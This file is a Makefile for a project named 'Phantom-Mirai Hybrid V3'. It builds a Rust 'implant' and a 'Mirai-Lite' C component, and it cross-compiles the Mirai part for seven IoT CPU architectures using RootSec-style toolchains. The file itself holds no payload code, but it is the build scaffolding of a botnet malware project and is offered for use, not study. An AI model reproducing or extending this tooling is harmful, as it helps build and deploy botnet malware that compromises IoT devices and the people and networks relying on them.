# Phantom-Mirai Hybrid V3 Centralized Build System

# Directories
DIR_IOT = crates/nodes/iot
DIR_PHANTOM = crates/nodes/phantom
DIR_TC = scripts/toolchains

# Toolchain Paths (Adjust based on extracted folders from setup_toolchains.sh)
# Examples based on standard RootSec naming
CC_MIPS = $(DIR_TC)/cross-compiler-mips/bin/mips-gcc
CC_MIPSEL = $(DIR_TC)/cross-compiler-mipsel/bin/mipsel-gcc
CC_ARM = $(DIR_TC)/cross-compiler-armv4l/bin/armv4l-gcc
CC_ARM7 = $(DIR_TC)/cross-compiler-armv7l/bin/armv7l-gcc
CC_SH4 = $(DIR_TC)/cross-compiler-sh4/bin/sh4-gcc
CC_X86 = $(DIR_TC)/cross-compiler-i586/bin/i586-gcc
CC_X86_64 = $(DIR_TC)/cross-compiler-x86_64/bin/x86_64-gcc

# List of IoT Architectures to build
IOT_ARCHS = mips mipsel arm arm7 sh4 x86 x86_64

.PHONY: all phantom iot clean $(IOT_ARCHS)

all: phantom iot

# --- Phantom (Rust Implant) ---
phantom:
	@echo "[+] Building Phantom Core (Rust)..."
	cd $(DIR_PHANTOM) && cargo build --release
	@echo "[+] Phantom Built: $(DIR_PHANTOM)/target/release/phantom_core"

# --- IoT (Mirai-Lite C) ---
iot: $(IOT_ARCHS)

# Individual Arch Rules
mips:
	@echo "[*] Building IoT for MIPS..."
	$(MAKE) -C $(DIR_IOT) CC="$(CC_MIPS)" TARGET="mirai_mips" clean all

mipsel:
	@echo "[*] Building IoT for MIPSEL..."
	$(MAKE) -C $(DIR_IOT) CC="$(CC_MIPSEL)" TARGET="mirai_mipsel" clean all

arm:
	@echo "[*] Building IoT for ARMv4..."
	$(MAKE) -C $(DIR_IOT) CC="$(CC_ARM)" TARGET="mirai_arm" clean all

arm7:
	@echo "[*] Building IoT for ARMv7..."
	$(MAKE) -C $(DIR_IOT) CC="$(CC_ARM7)" TARGET="mirai_arm7" clean all

sh4:
	@echo "[*] Building IoT for SH4..."
	$(MAKE) -C $(DIR_IOT) CC="$(CC_SH4)" TARGET="mirai_sh4" clean all

x86:
	@echo "[*] Building IoT for x86..."
	$(MAKE) -C $(DIR_IOT) CC="$(CC_X86)" TARGET="mirai_x86" clean all

x86_64:
	@echo "[*] Building IoT for x86_64..."
	$(MAKE) -C $(DIR_IOT) CC="$(CC_X86_64)" TARGET="mirai_x86_64" clean all

# Local Debug Build (Host OS)
iot_debug:
	@echo "[*] Building IoT for Host (Debug)..."
	$(MAKE) -C $(DIR_IOT) clean all

clean:
	@echo "[-] Cleaning Phantom..."
	cd $(DIR_PHANTOM) && cargo clean
	@echo "[-] Cleaning IoT..."
	$(MAKE) -C $(DIR_IOT) clean
